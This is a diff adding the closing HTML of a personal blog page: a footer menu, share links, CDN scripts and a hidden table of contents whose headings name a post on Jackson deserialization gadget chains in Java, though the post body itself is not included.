+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/friends">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">Jackson原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96demo"><span class="toc-number">1.1.</span> <span class="toc-text">简单的反序列化demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-SpringBoot-%E7%8E%AF%E5%A2%83%E7%A8%B3%E5%AE%9A%E8%A7%A6%E5%8F%91-getOutputProperties-%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">在 SpringBoot 环境稳定触发 getOutputProperties 的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">调试过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACjava%E4%BD%BF%E7%94%A8EventListenerList%E8%A7%A6%E5%8F%91toString"><span class="toc-number">1.3.</span> <span class="toc-text">高版本java使用EventListenerList触发toString</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">调试过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACjava%E4%BD%BF%E7%94%A8TextAndMnemonicHashMap%E8%A7%A6%E5%8F%91toString"><span class="toc-number">1.4.</span> <span class="toc-text">高版本java使用TextAndMnemonicHashMap触发toString</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">调试过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">Jackson反序列化漏洞</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=Jackson反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Jackson反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=Jackson反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Jackson反序列化&body=Check out this article: https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Jackson反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Jackson反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Jackson反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Jackson反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=Jackson反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=Jackson反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    le0n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends">friends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
